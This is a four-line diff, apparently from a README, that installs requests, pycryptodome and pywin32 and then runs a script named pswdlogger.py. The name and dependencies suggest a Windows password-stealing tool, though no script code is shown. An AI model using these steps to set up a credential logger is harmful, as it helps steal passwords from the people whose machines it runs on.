@@ -1,0 +1,4 @@
+pip install requests pycryptodome pywin32
+
+#Run the script
+python pswdlogger.py
